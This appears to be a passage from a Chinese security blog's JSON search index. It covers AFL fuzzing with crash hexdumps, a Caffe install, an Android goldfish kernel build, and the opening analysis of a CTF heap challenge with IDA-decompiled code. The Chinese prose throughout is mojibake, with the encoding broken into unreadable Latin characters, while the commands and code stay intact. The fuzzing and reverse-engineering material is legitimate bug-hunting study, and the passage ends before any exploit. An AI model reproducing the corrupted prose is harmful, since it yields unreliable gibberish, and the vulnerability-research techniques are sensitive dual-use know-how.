..\n00000050: 2020 2020 2020 2020 2020 2020 2020 2020\n00000060: 2020 2020 2020 2020 2020 2020 2020 0820                .\n00000070: 2020 0c20 e21f 2002 7f80 2020 6b20 0101    . .. ...  k ..\n00000080: 0101 0101 1d01 0101 0101 0101 0101 0101  ................\n00000090: 0101 0101 0101 0101 0101 0101 40ff 2080  ............@. .\nroot@x:~/afl-test/output/crashes# xxd id:000001,sig:11,src:000002,op:arith8,pos:0,val:-28\n00000000: 4662 6262 627f 001a                      Fbbbb...\nroot@x:~/afl-test/output/crashes# xxd id:000002,sig:06,src:000002,op:havoc,rep:128\n00000000: 3685 c13e 3e3e 002f 3e3e 203e 3e6a 3e3e  6..>>>./>> >>j>>\n00000010: 3ee4 343e 3e3e 3e53 3d5b 146a 3e3e 2e3e  >.4>>>>S=[.j>>.>\n00000020: 3e3e 3e4e 3e6a 3e5c 273e 3e3e 3e3e 6a3e  >>>N>j>\\'>>>>>j>\n00000030: 3e8c 3e3e 3e3e 4a3e 6a3e 3e27 d9c5 a8c5  >.>>>>J>j>>'....\n00000040: 5314 533e 3e1d 3e3e 3e3e 3e3e 3e3e 3e3e  S.S>>.>>>>>>>>>>\n00000050: 3e3e 3e3e 3e3e 3e3e 3e3e 3e3e 3e3e 3e3e  >>>>>>>>>>>>>>>>\n00000060: 3e3e 3e3e 3e2f 3e3e 343e 3e6a 3e3e 0080  >>>>>/>>4>>j>>..\n00000070: 3e3e 3e27 fb9c 9c9c 9c9c 9c9c 9c9c c5c5  >>>'............\n00000080: c5a6 c5e0 7fff                           ......\nroot@x:~/afl-test/output/crashes# xxd id:000003,sig:06,src:000001+000002,op:splice,rep:4\n00000000: 2532 6e5a 627f fc19                      %2nZb...\nroot@x:~/afl-test/output/crashes# xxd id:000004,sig:06,src:000001,op:havoc,rep:128\n00000000: 4106 00f2 5fdf 03a0 c5f6 dfdf 40a0 dff4  A..._.......@...\n00000010: f5ff e5f4 f4fe 04f5 f4f4 f4f4 f4f4 f4f4  ................\n00000020: 0ef5 f4ff 800d f4b4 f400 f4f4 0edb eadf  ................\n00000030: f8df dfe7 f400 eadd dfe7 df02 dff8 00d7  ................\n00000040: dfdf 01df dfdf ecdb eadf f8df dfe7 dfdf  ................\n00000050: dff8 1ad7 dfdf 01da dfdf dedf dfdf dfdf  ................\n00000060: dfdf dfdf dfdf dfdf dfdf dfde dfdf dfde  ................\n00000070: ed00 e3e3 e316 0d00 0000 1000 00c0 dfe7  ................\n00000080: dfdf df00 d701 dfd6 0e                   .........\nroot@x:~/afl-test/output/crashes# xxd id:000005,sig:11,src:000002+000001,op:splice,rep:16\n00000000: 4132 800f fe0f 0f0f 0f0f 220f 0f0f 0f0f  A2........\".....\n00000010: 0f0f 0f0f 0f0f 0f0f 0f0f 0ef0 0f22 0f0f  .............\"..\n00000020: 0f0f 0f0f 0f0f 0f0f 0f0f 0f0f 0f0f 0f0f  ................\n00000030: 0f0f 0f0f 0f0f 0f0f 0f0f 0f7f ff64 0f0f  .............d..\n00000040: fc0e 000f 0f0f 0f0f 0fff                 ..........\n```\n\n## 1.4 ç»§ç»­å·²åœæ­¢çš„fuzzæµ‹è¯•\n\n```shell\nafl-fuzz -i- -o output ./test\n```\n\n## 1.5 ç»“åˆASANçš„fuzz\n\n> ASANåªæ¨èåœ¨32ä½æœºå™¨ä¸Šä½¿ç”¨ã€‚å¦‚æœåœ¨64ä½æœºå™¨ä¸Šä½¿ç”¨ï¼Œä¹Ÿéœ€å°†AFLç¼–è¯‘æˆ32ä½çš„ã€‚\n\n ```\nMethod 1. set AFL_USE_ASAN=1 before calling â€˜make clean allâ€™\nMethod 2. add -fsanitize=address option into makefile\n ```\n\n## 1.6 æ–‡ä»¶fuzz\n\n> 1.2å’Œ1.3èŠ‚è®²çš„æ˜¯ä»stdinè¯»å–è¾“å…¥çš„ç›®æ ‡ç¨‹åºï¼Œè¿™é‡Œè¡¥å……ä¸€ä¸‹ä»æ–‡ä»¶è¯»å–è¾“å…¥çš„ç›®æ ‡ç¨‹åºï¼Œä»¥ `readelf -a xxfile` ä¸ºä¾‹ã€‚\n\næœ‰æºç æ’æ¡©ï¼š\n\n```\nafl-fuzz -i in/ -o out/ ./readelf -a @@\n```\n\næ— æºç æ’æ¡©ï¼š\n\n```\nafl-fuzz -i in/ -o out/ -Q ./readelf -a @@\n```\n\n\n\n# 2 æ— æºç AFL fuzz\n\n> æ— æºç æ—¶ï¼Œå³æ— æ³•å¯¹æºç ä½¿ç”¨åŠŸèƒ½afl-gcc/afl-g++è¿›è¡Œæ’æ¡©ç¼–è¯‘æ—¶ï¼Œæ•´ä¸ªfuzzè¿‡ç¨‹ä¼šå˜å¾—å¼‚å¸¸ç¼“æ…¢ã€‚ä½†ç¡®å®æ²¡æœ‰æºç çš„æƒ…å†µä¸‹å¯ä½¿ç”¨è¯¥æ–¹æ³•ã€‚\n\n**æ­¥éª¤1**ï¼šç¼–è¯‘æ”¯æŒæ— æºç fuzzçš„AFL\n\nåœ¨aflæºç ç›®å½•ä¸‹ï¼š\n\n```\ncd qemu_mode\n./build_qemu_support.sh\ncd ..\nmake install \n```\n\n**æ­¥éª¤2**ï¼šè·Ÿ1.2å’Œ1.3èŠ‚ä¸€æ ·ï¼Œåªä¸è¿‡æœ‰ä¸¤ç‚¹å·®å¼‚ï¼š\n\n- å¾…æµ‹ç¨‹åºæ˜¯æœªç»afl-gccæ’æ¡©ç¼–è¯‘è¿‡çš„ï¼Œå¦‚ä½¿ç”¨gccç¼–è¯‘\n\n- æ‰§è¡Œafl-fuzzå‘½ä»¤æ—¶å¤šåŠ äº†ä¸€ä¸ª`-Q`å‚æ•°\n\n```\nafl-fuzz -i testcase/ -o output/ -Q ./test\n```\n\n# 3 AFLæ–‡æ¡£å­¦ä¹ \n\n\n\naflé¢æ¿ä»‹ç»ï¼š\n\nhttps://lcamtuf.coredump.cx/afl/status_screen.txt\n\n\n\n# 4 å‚è€ƒæ–‡æ¡£\n\n[åˆæ¢AFL-Fuzz](https://xz.aliyun.com/t/4314)\n\n[å°ç™½åˆå­¦AFL(American Fuzzy Lop)](https://blog.csdn.net/weixin_39448417/article/details/99703723)\n\n[AFLæ–‡ä»¶å˜å¼‚ä¸€è§ˆ](http://rk700.github.io/2018/01/04/afl-mutations/)\n\n[AFL(American Fuzzy Lop) Cautions](https://stfpeak.github.io/2017/06/12/AFL-Cautions/)","categories":["Fuzzing"]},{"title":"caffeçš„å®‰è£…ä¸ä½¿ç”¨","url":"/2020/06/30/caffe/","content":"\n# 1 caffeå®‰è£…\n\n## 1.1 å®‰è£…ä¾èµ–\nè™šæ‹Ÿæœºä¸ºubuntu 16.04ï¼Œä»…cpuã€‚\næŒ‰ç…§å®˜ç½‘å®‰è£…ç›¸åº”ä¾èµ–ï¼ˆhttps://caffe.berkeleyvision.org/install_apt.htmlï¼‰ï¼Œæ‰§è¡Œäº†ä¸€ä¸‹å‡ æ¡å‘½ä»¤ï¼š\n\n```shell\né€šç”¨ä¾èµ–ï¼š\nsudo apt-get install libprotobuf-dev libleveldb-dev libsnappy-dev libopencv-dev libhdf5-serial-dev protobuf-compiler\nsudo apt-get install --no-install-recommends libboost-all-dev\n\nblasä¾èµ–ï¼š\nsudo apt-get install libatlas-base-dev\n\npythonä¾èµ–ï¼š\nsudo apt-get install python-dev\n\nä»¥ä¸‹ä¾èµ–ä¸çŸ¥æ˜¯å¦å¿…é¡»å®‰è£…ï¼š\nsudo apt-get install libgflags-dev libgoogle-glog-dev liblmdb-dev\n```\n\n## 1.2 æºç å®‰è£…\næºç åœ°å€ï¼šhttps://github.com/BVLC/caffe\nå®˜ç½‘æ–¹æ³•ï¼šhttps://caffe.berkeleyvision.org/installation.html#compilation\nå‚è€ƒä¸­æ–‡é“¾æ¥ï¼šhttps://www.jianshu.com/p/8878d2bdaf99\n### 1.2.1 ç¼–è¯‘æºç \n```shell\nunzip caffe-master.zip\ncd caffe-master\ncp Makefile.config.example Makefile.config\n```\næ›´æ”¹Makefile.configæ–‡ä»¶ä¸­ï¼Œå¦‚ä¸‹è¡Œï¼š\n```shell\n`CPU_ONLY := 1`å‰çš„æ³¨é‡Šç¬¦â€œ#â€å»æ‰\nå°†ï¼š\nINCLUDE_DIRS := $(PYTHON_INCLUDE) /usr/local/include\nLIBRARY_DIRS := $(PYTHON_LIB) /usr/local/lib /usr/lib\nä¿®æ”¹ä¸ºï¼š\nINCLUDE_DIRS := $(PYTHON_INCLUDE) /usr/local/include /usr/include/hdf5/serial\nLIBRARY_DIRS := $(PYTHON_LIB) /usr/local/lib /usr/lib /usr/lib/x86_64-linux-gnu/hdf5/serial\n```\næ‰§è¡Œå¦‚ä¸‹ä¸‰æ¡å‘½ä»¤å®Œæˆå®‰è£…ï¼š\n```shell\nsudo make all\nsudo make test\nsudo make runtest\n```\n### 1.2.2 pythonç¯å¢ƒ\n\n```shell\nå®‰è£…pipï¼š\nsudo apt-get install python-pip\n\nå®‰è£…pythonå€Ÿå£ä¾èµ–åº“ï¼š\nsudo apt-get install gfortran\ncd /home/bling/caffe-master/python\nfor req in $(cat requirements.txt); do pip install $req; done\n\néªŒè¯ï¼š\nsudo pip install -r requirements.txt\n\nè®¾ç½®ç¯å¢ƒå˜é‡ï¼š\nsudo vim ~/.bashrc\n\texport PYTHONPATH=/home/bling/caffe-master/python:$PYTHONPATH\nsource ~/.bashrc\n```\n\nå®‰è£…pycaffe\n```shell\ncd /home/bling/caffe-master/\nsudo make pycaffe\n\néªŒè¯ä½¿ç”¨ï¼Œè¿›pythonç¯å¢ƒï¼Œè¾“å…¥\nimport caffe\n```\n\n# ä½¿ç”¨ç¤ºä¾‹\nMNIST tutorialï¼š\nhttps://caffe.berkeleyvision.org/gathered/examples/mnist.html\n\nreference ImageNet model tutorialï¼š\nhttps://caffe.berkeleyvision.org/gathered/examples/imagenet.html","categories":["AI"]},{"title":"androidæ¨¡æ‹Ÿå™¨goldfishç¯å¢ƒæ­å»º","url":"/2020/06/30/goldfish/","content":"\n# 1 ç¯å¢ƒå‡†å¤‡\n\n## 1.1 ç¡¬ä»¶åŠä¸»æœºç³»ç»Ÿ\n\n- ä½¿ç”¨AVDæ—¶éœ€è¦ç¡¬ä»¶æ”¯æŒKVMã€‚å› æ­¤ç°åœ¨ä¸»æœºbiosä¸­å°†è™šæ‹ŸåŒ–è®¾ç½®å¼€å¯ã€‚\n- x86æ¶æ„çš„ä¸»æœºï¼Œå®‰è£…äº†ubuntu16.04æ“ä½œç³»ç»Ÿã€‚\n\næ£€æŸ¥ç³»ç»Ÿæ˜¯å¦æ”¯æŒè™šæ‹ŸåŒ–çš„ä¸¤æ¡å‘½ä»¤ï¼š\n```shell\nkvm-ok\n\negrep -c '(vmx|svm)' /proc/cpuinfo\n```\n\n## 1.2 ä¸‹è½½goldfishæºç \n\nï¼ˆ1ï¼‰åœ¨çº¿æ–¹å¼ - æ¨è\n\nè®¿é—®å¦‚ä¸‹å®˜ç½‘ï¼Œæ‰§è¡Œgit cloneå°†å·¥ç¨‹å…‹éš†åˆ°æœ¬åœ°ï¼Œä¹‹åå¯ä»¥æ ¹æ®éœ€è¦é€‰æ‹©ä¸åŒå†…æ ¸ç‰ˆæœ¬è¿›è¡Œç¼–è¯‘ã€‚\n\nhttps://android.googlesource.com/kernel/goldfish.git\n\nï¼ˆ2ï¼‰ç¦»çº¿æ–¹å¼\n\nåœ¨å®˜ç½‘ä¸­ä¸‹è½½ç‰¹å®šç‰ˆæœ¬çš„goldfishå†…æ ¸taråŒ…ï¼Œåˆ°ubuntuä¸­è§£å‹ã€‚\n\n## 1.3 å®‰è£…java\n\nå‚è€ƒ å®‰è£…java jdkçš„ä¸‰ç§æ–¹å¼ï¼šhttps://blog.csdn.net/zbj18314469395/article/details/86064849\n\n## 1.4 é…ç½®äº¤å‰ç¼–è¯‘ç¯å¢ƒ\n\nä¸‹è½½äº¤å‰ç¼–è¯‘å™¨ï¼šhttps://android.googlesource.com/platform/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9/\n\nå¯åœ¨ä»¥ä¸Šé“¾æ¥ä¸­é€‰æ‹©ä¸åŒçš„äº¤å‰ç¼–è¯‘å™¨ï¼Œ32ä½æˆ–64ä½ï¼Œæ ¹æ®å®é™…æƒ…å†µä¸‹è½½\n\nä¸‹è½½åˆ°æœ¬åœ°åï¼Œé…ç½®ç¯å¢ƒå˜é‡\n```shell\nvim ~/.bashrc\n\nexport PATH=xxx/platform/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9/bin:$PATH\nexport PATH=xxx/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9/bin:$PATH\nexport CROSS_COMPILE=aarch64-linux-android-\n\nsource ~/.bashrc\n```\n\n## 1.5 å®‰è£…linuxç‰ˆandroid studio\n\nï¼ˆ1ï¼‰ç¦»çº¿æ–¹å¼ - æ¨è\nåœ¨android studioå®˜ç½‘ï¼ˆhttps://developer.android.com/studioï¼‰ä¸‹è½½åŒ…ï¼Œæœ¬åœ°è§£å‹åï¼Œè¿›å…¥`android-studio/bin/`ç›®å½•æ‰§è¡Œ`./studio.h`å³å¯å¯åŠ¨ASã€‚\n\nï¼ˆ2ï¼‰åœ¨çº¿æ–¹å¼\n\nhttps://rotolo.dev/android-studio/\n\n```shell\nsudo apt-add-repository ppa:paolorotolo/android-studio \nsudo apt-get update\nsudo apt-get install android-studio\n```\n\n## 1.6 é…ç½®AS\n\nï¼ˆ1ï¼‰æœ‰ç½‘ç»œçš„æƒ…å†µ\n\né…ç½®ASçš„ä»£ç†ï¼Œç›´æ¥è¿æ¥google\n\nè¿™ç§æ–¹å¼ä¸‹çš„sdkï¼Œndkï¼ŒAVD system-imageç­‰ç­‰éƒ½å¯ä»¥åœ¨çº¿ä¸‹è½½ï¼Œå¾ˆæ–¹ä¾¿ã€‚\n\nï¼ˆ2ï¼‰æ²¡æœ‰ç½‘ç»œçš„æƒ…å†µ\n\næ‰‹å·¥ä¸‹è½½android sdkæˆ–è€…system imagesç­‰ç­‰ï¼ŒæŒ‰ç…§è¿™ä¸ªç½‘ç«™çš„æŒ‡å¯¼ï¼šhttps://my.oschina.net/u/862582/blog/349263\n\nå¦ä¸€ä¸ªæ‰‹å·¥ä¸‹è½½sdkå‚è€ƒï¼šhttps://www.jianshu.com/p/86b9c57bf838\n\næ‰‹å·¥ä¸‹è½½ndkå‚è€ƒï¼šhttps://www.jianshu.com/p/abdad7fd1367\n\nï¼ˆ3ï¼‰é…ç½®ubuntuç¯å¢ƒå˜é‡\n\nåœ¨sdk managerä¸­å°†éœ€è¦çš„ç»„ä»¶ä¸‹è½½å®Œæ¯•åï¼Œè®¾ç½®ä»¥ä¸‹å‡ ä¸ªç›®å½•åˆ°ç¯å¢ƒå˜é‡ä¸­ï¼šsdk/emulator/platform-tools/ndk/avd\n\n```shell\nvim ~/.bashrc\n\nexport ANDROID_HOME=/xxx/xxx/android-sdk-linux\nexport PATH=$ANDROID_HOME/emulator:$PATH\nexport PATH=$ANDROID_HOME/platform-tools:$PATH\nexport PATH=$ANDROID_HOME/ndk/xxx:$PATH\nexport PATH=~/.android/avd:$PATH\n\nsource ~/.bashrc\n```\n\n## 1.7 ä½¿ç”¨emulator\n\n`android avd`å‘½ä»¤å¯ä»¥å¯åŠ¨android device manager\n\n`android -avd xxx `æŒ‡å®šxxxé•œåƒå¯åŠ¨æ¨¡æ‹Ÿå™¨ï¼ˆä½¿ç”¨AVD manageråˆ›å»ºå®Œè™šæ‹Ÿè®¾å¤‡åï¼Œåœ¨`~/.android/avd`ç›®å½•ä¸‹ä¼šæœ‰xxx.iniï¼‰\n\næ¨¡æ‹Ÿå™¨ç›¸å…³å‘½ä»¤å‚è€ƒï¼šhttps://developer.android.com/studio/run/emulator-commandline?hl=zh-cn\n\n## 1.8 åŠ è½½ä½ç‰ˆæœ¬kernel\n\næœ€æ–°ç‰ˆçš„android studioå’Œsdkå‡ä¸æ”¯æŒåŠ è½½ç‰ˆæœ¬<3.10çš„å†…æ ¸ï¼Œæƒ³åŠ è½½ä½ç‰ˆæœ¬å†…æ ¸åšå®éªŒçš„è¯ï¼Œå¯ä½¿ç”¨å¦‚ä¸‹é“¾æ¥æä¾›çš„sdkã€‚\n\nhttp://dl.google.com/android/android-sdk_r24.4.1-linux.tgz\n\n`android` - å‘½ä»¤ï¼Œå¯åŠ¨android sdkç®¡ç†å™¨\n\n`android avd` - å‘½ä»¤ï¼Œå¯åŠ¨avd manager\n\n`emulator -avd xxx` - å‘½ä»¤ï¼Œè·Ÿæœ€æ–°ç‰ˆç›¸åŒ\n\n# 2 ç¼–è¯‘goldfishå†…æ ¸\n\nå‡è®¾git cloneçš„goldfishå·¥ç¨‹åœ¨~/kernel/goldfishç›®å½•ä¸‹\n\n```shell\ncd ~/kernel\ncp -r goldfish goldfish44\n## åˆ›å»ºä¸€ä¸ªout44ç›®å½•ï¼Œç”¨æ¥å­˜æ”¾ç¼–è¯‘è¾“å‡º\nmkdir out44\ncd goldfish44\ngit branch -a\n## ä»goldfishä¸­æ‹‰å‡ºkernel4.4åˆ†æ”¯\ngit checkout -b android-goldfish-4.4-dev remotes/origin/android-goldfish-4.4-dev\n## ~/kernel/goldfish44/arch/arm64/configsç›®å½•ä¸‹æœ‰ç¼–è¯‘é…ç½®æ–‡ä»¶defconfigå’Œranchu64_defconfigï¼Œæˆ‘ä»¬ä½¿ç”¨ranchu64_defconfig\n## åœ¨goldfish44ç›®å½•ä¸‹æŒ‡å®šå¥½é…ç½®æ–‡ä»¶\nmake ARCH=arm64 O=../out44 ranchu64_defconfig\nmake ARCH=arm64 O=../out44/ -j16\n```\n\nç¼–è¯‘å®Œæˆåï¼Œå¦‚æœéœ€è¦æ›´æ”¹é…ç½®ï¼ˆå¦‚å…è®¸å†…æ ¸åŠ è½½è‡ªå®šä¹‰koæ¨¡å—ï¼‰ï¼Œæ“ä½œå¦‚ä¸‹\n\n```shell\n## åœ¨goldfish44ç›®å½•ä¸‹æ‰§è¡Œ\n## å›¾å½¢åŒ–é…ç½®å†…æ ¸é€‰é¡¹\nmake ARCH=arm64 O=../out44/  menuconfig\n## é…ç½®å˜åŒ–çš„æ—¶å€™æ‰§è¡Œæ¸…ç†ä¸€ä¸‹\nmake mrproper\n## å¼€å§‹ç¼–è¯‘\nmake ARCH=arm64 O=../out44/ -j16\n```\n\nç¼–è¯‘ç”Ÿæˆçš„å†…æ ¸æ–‡ä»¶åœ¨å¦‚ä¸‹ç›®å½•ï¼š`~/kernel/out44/arch/arm64/boot/Image.gz`\n\n# 3 ä½¿ç”¨ç¼–è¯‘çš„å†…æ ¸å¯åŠ¨avdè™šæ‹Ÿè®¾å¤‡\n\næ‰§è¡Œä»¥ä¸‹å‘½ä»¤ä»¥è‡ªç¼–è¯‘çš„å†…æ ¸å¯åŠ¨è™šæ‹Ÿæœº\n```shell\nemulator -avd KernelTest -no-window -no-audio -show-kernel -kernel ~/work/kernel/out49/arch/arm64/boot/Image.gz -no-snapstorage\n```","categories":["Others"]},{"title":"calc heap","url":"/2020/06/25/calc-heap/","content":"\n# 1 åˆ†æ\n\n[é¢˜ç›®äºŒè¿›åˆ¶](https://xuanxuanblingbling.github.io/assets/attachment/calc)\n\nå†™write upä¹‹å‰ï¼Œè¦åæ§½ä¸€ä¸‹ï¼Œè¿™åˆæ˜¯ä¸€é“åšå¾—è®©æˆ‘æ€€ç–‘äººç”Ÿçš„é¢˜ã€‚å‰åæ‹–äº†ä¸€ä¸ªæœˆæ‰ç‹ ä¸‹å¿ƒæŠŠè¿™é¢˜ç»ˆäºç»ˆäºåšå®Œäº†ã€‚ä¸€ç‚¹ä¸€ç‚¹ç§¯ç´¯ï¼Œå¸Œæœ›ä¸€å¹´æˆ–è€…å‡ å¹´åèƒ½çœ‹åˆ°è‡ªå·±çš„è¿›æ­¥ã€‚\n\n## 1.1 æŸ¥çœ‹ç¨‹åºåŸºæœ¬ä¿¡æ¯\n\n```shell\n$ file calc\ncalc: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=454ff27c25ea5028bffdcfaf81e1c178d5cbce3a, stripped\n$ checksec calc\n[*] '/mnt/hgfs/VMshare/calc/calc'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x8048000)\n    RWX:      Has RWX segments\n```\n\n## 1.2 è¿è¡Œè¯•è¯•\n\n```shell\n$ ./calc\n> 1\n1\n> 3\n3\n> 1111\n1111\n> 2+2\ninvalid number\n> 2 + 3\n5\n```\n\n## 1.3 IDAé€†å‘\n\nå¦‚ä¸‹æ˜¯IDAé€†å‘å‡ºæ¥ï¼Œmainå‡½æ•°ä¸­çš„ä¸»è¦ä»£ç ï¼Œå¯¹è¿™æ®µä»£ç è¿›è¡Œåˆ†æã€‚\n\n```c\n  v13 = __readgsdword(0x14u);\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(stderr, 0, 2, 0);\n  dword_804D0B0 = sub_804A929();\t\t// 1\n  dword_804D0B4 = sub_804A8E9();\t\t// 2\n  dword_804D0AC = sub_804A8E9();\t\t// 3\n  v0 = sub_804A83F(\"add\", (int)sub_80494AA);\t//4\n  sub_804A946(dword_804D0B0, \"add\", v0);\t\t//5\n  v1 = sub_804A83F(\"sub\", (int)sub_8049C81);\t//6\n  sub_804A946(dword_804D0B0, \"sub\", v1);\t\t//7\n  v2 = sub_804A83F(\"mul\", (int)sub_8049A0E);\n  sub_804A946(dword_804D0B0, \"mul\", v2);\n  v3 = sub_804A83F(\"div\", (int)sub_8049DED);\n  sub_804A946(dword_804D0B0, \"div\", v3);\n  v4 = sub_804A83F(\"mod\", (int)sub_8049F90);\n  sub_804A946(dword_804D0B0, \"mod\", v4);\n  v5 = sub_804A83F(\"not\", (int)sub_804A135);\n  sub_804A946(dword_804D0B0, \"not\", v5);\n  v6 = sub_804A83F(\"int\", (int)sub_8049854);\n  sub_804A946(dword_804D0B0, \"int\", v6);\n  v7 = sub_804A83F(\"exit\", (int)sub_804A688);\n  sub_804A946(dword_804D0B0, \"exit\", v7);\n  v8 = sub_804A83F(\"equals\", (int)sub_804A3C2);\n  sub_804A946(dword_804D0B0, \"equals\", v8);\n  v9 = sub_804A83F(\"type\", (int)sub_804A61E);\n  sub_804A946(dword_804D0B0, \"type\", v9);\n  v10 = sub_804A83F(\"len\", (int)sub_804A308);\n  sub_804A946(dword_804D0B0, \"len\", v10);\n  while ( 1 )\t\t//8\n  {\n    memset(&s, 0, 0x100u);\n    printf(\"> \");\n    if ( !fgets(&s, 256, stdin) )\t\t//9\n      break;\n    v11 = strrchr(&s, '\\n');\t\t//10\n    if ( v11 )\n      *v11 = 0;\n    sub_8048BC1(&s);\t\t//11\n  }\n```\n\n### line 1 2 3 \n\n```c\n  dword_804D0B0 = sub_804A929();\t\t// 1\n  dword_804D0B4 = sub_804A8E9();\t\t// 2\n  dword_804D0AC = sub_804A8E9();\t\t// 3\n```\n\ndword_804D0B0ï¼Œdword_804D0B4ï¼Œdword_804D0ACéƒ½æ˜¯bssæ®µçš„å˜é‡ï¼Œå„å 4ä¸ªå­—èŠ‚ã€‚è¿™ä¸‰ä¸ªå˜é‡åˆ†åˆ«æ¥å—sub_804A929()å’Œsub_804A8E9()è¿™ä¸¤ä¸ªå‡½æ•°çš„è¿”å›å€¼ã€‚ä¸‹é¢æˆ‘ä»¬æ¥çœ‹çœ‹è¿™ä¸¤ä¸ªå‡½æ•°ã€‚\n\n```shell\n.bss:0804D0AC dword_804D0AC   dd ?                   \n.bss:0804D0AC                                      \n.bss:0804D0B0 ; int dword_804D0B0\n.bss:0804D0B0 dword_804D0B0   dd ?                  \n.bss:0804D0B0                                        \n.bss:0804D0B4 dword_804D0B4   dd ?   \n```\n\n- sub_804A929()\n\n  è¿™ä¸ªå‡½æ•°åªæœ‰ä¸€å¥`return calloc(0x10u, 1u)`ï¼Œç”³è¯·å¤§å°ä¸º0x10çš„å †ç©ºé—´ï¼Œå¹¶å°†å †çš„åœ°å€è¿”å›ç»™dword_804D0B0ã€‚\n\n- sub_804A8E9()\n\n  è¿™ä¸ªå‡½æ•°ä¸­ç”³è¯·äº†0x84å¤§å°çš„å †ç©ºé—´ï¼Œå¹¶è¿”å›ã€‚å› æ­¤dword_804D0B4ï¼Œdword_804D0ACåˆ†åˆ«æŒ‡å‘å¤§å°ä¸º0x84çš„å †ã€‚\n\n![](image-20200626202214785.png)\n\n### line 4 5 6 7\n\nè¿™å››è¡Œä»¥åŠä¹‹åçš„è®¸å¤šè¡Œéƒ½æ˜¯åœ¨é‡å¤4 5è¡Œçš„å‡½æ•°ï¼Œå› æ­¤åˆ†æå®Œå‰ä¸¤ä¸ªå°±èƒ½æ¨æ–­ä¹‹åçš„æ“ä½œã€‚\n\nå…ˆçœ‹4 5 è¡Œï¼Œæ¶‰åŠä¸¤ä¸ªå‡½æ•°sub_804A83F()å’Œsub_804A946()ï¼Œä»¥åŠä¸€ä¸ªå‡½æ•°æŒ‡é’ˆsub_80494AAå’Œä¸€ä¸ªbssæ®µçš„å˜é‡dword_804D0B0ã€‚æ¥ä¸‹æ¥é‡ç‚¹åˆ†æè¿™ä¸¤ä¸ªå‡½æ•°ã€‚\n\n```c\n  v0 = sub_804A83F(\"add\", (int)sub_80494AA);\t//4\n  sub_804A946(dword_804D0B0, \"add\", v0);\t\t//5\n```\n\n#### sub_804A83F()\n\nå‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š\n\n```c\n_DWORD *__cdecl sub_804A83F(char *s, int a2)\n{\n  _DWORD *v2; // ST1C_4\n\n  v2 = calloc(0x10u, 1u);\n  *v2 = strdup(s);\n  v2[2] = a2;\n  v2[1] = \"function\";\n  v2[3] = 0;\n  return v2;\n}\n```\n\nè¾“å…¥ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ•´å‹å€¼ï¼ˆå‡½æ•°æŒ‡é’ˆçš„åœ°å€ï¼‰ã€‚å‡½æ•°å†…å…ˆç”³è¯·ä¸€ä¸ªå¤§å°ä¸º0x10çš„å †ç©ºé—´ï¼ˆ*v2æŒ‡å‘è¯¥å †ç©ºé—´ï¼‰ï¼Œç„¶åå°†è¾“å…¥çš„å­—ç¬¦ä¸²åœ°å€ï¼ˆstrdupç”³è¯·äº†ä¸€ä¸ªå †ç©ºé—´ç”¨æ¥å­˜æ”¾å­—ç¬¦ä¸²ï¼‰æ”¾åœ¨v2[0]ï¼›v2[1]å¤„å­˜æ”¾å­—ç¬¦ä¸²\"function\"çš„åœ°å€ï¼Œæ ‡å¿—è¿™æ˜¯ä¸€ä¸ªfunctionå †ï¼›å°†ä¼ å…¥çš„å‡½æ•°æŒ‡é’ˆåœ°å€æ”¾åœ¨v2[2]ï¼›v2[3]ç½®ç©ºã€‚æœ€åå°†è¯¥å †å—è¿”å›ç»™ä¸Šä¸€å±‚è°ƒç”¨è€…ã€‚\n\n```\nv2å †å—å¦‚ä¸‹ã€‚ä»¥ç¬¬4è¡Œä¸ºä¾‹ï¼Œheap1ä¸­å­˜æ”¾ç€å­—ç¬¦ä¸²â€œaddâ€ï¼›string1å¤„çš„å­—ç¬¦ä¸²ä¸ºâ€œfunctionâ€ï¼›function1æ˜¯ä¸€ä¸ªå¤„ç†addé€»è¾‘çš„å‡½æ•°ã€‚\n|------------|\n| &heap1     |\n|------------|\n| &string1   |\n|------------|\n| &function1 |\n|------------|\n| 0          |\n|------------|\n```\n\n#### sub_804A946()\n\nä»¥addä¸ºä¾‹ï¼Œè¯¥å‡½æ•°çš„å‚æ•°åˆ†åˆ«ä¸ºdword_804D0B0ï¼ˆbssæ®µçš„ä¸€ä¸ªå€¼ï¼Œä¸ºä¸€ä¸ªå †å—åœ°å€ï¼‰ï¼Œ \"add\"å­—ç¬¦ä¸²,ï¼Œä»¥åŠä¸Šä¸€ä¸ªå‡½æ•°sub_804A83F()çš„è¿”å›å€¼ï¼ˆä¸€ä¸ª0x10å¤§å°çš„å †å—ï¼‰ã€‚sub_804A946()å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼Œæˆ‘åœ¨å‡½æ•°ä¸­æ ‡è®°äº†æ³¨é‡Šã€‚\n\n```c\nint __cdecl sub_804A946(int a1, char *s, int a3)\n{\n  int result; // eax\n  size_t i; // [esp+4h] [ebp-14h]\n  int v5; // [esp+8h] [ebp-10h]\n  signed int v6; // [esp+Ch] [ebp-Ch]\n/*æ£€æŸ¥dword_804D0B0å †å—ç¬¬ä¸€ä¸ªå­—èŠ‚æŒ‡å‘çš„å †å—æ˜¯å¦ä¸ºç©ºã€‚å¦‚æœæ˜¯ç©ºï¼Œå°±ç”³è¯·ä¸€ä¸ªå¤§å°ä¸º0x10çš„å †ï¼Œå¹¶åœ¨è¯¥å †å—åç§»8å­—èŠ‚å¤„å†™å…¥å­—ç¬¦â€˜aâ€™ï¼›å¦‚æœéç©ºï¼Œåˆ™è·³è¿‡æ‰§è¡Œä¸‹é¢çš„éƒ¨åˆ†ã€‚*/\n  if ( !*a1 )\t\n  {\n    *a1 = calloc(0x10u, 1u);\n    *(*a1 + 8) = *s;\n  }\n/*v5èµ‹å€¼dword_804D0B0å †å—ç¬¬ä¸€ä¸ªå­—èŠ‚æŒ‡å‘çš„å †å—åœ°å€ï¼ˆå³*a1ï¼‰ï¼Œv6èµ‹å€¼ä¼ å…¥å­—ç¬¦ä¸²sçš„é•¿åº¦ã€‚*/\n  v5 = *a1;\n  v6 = 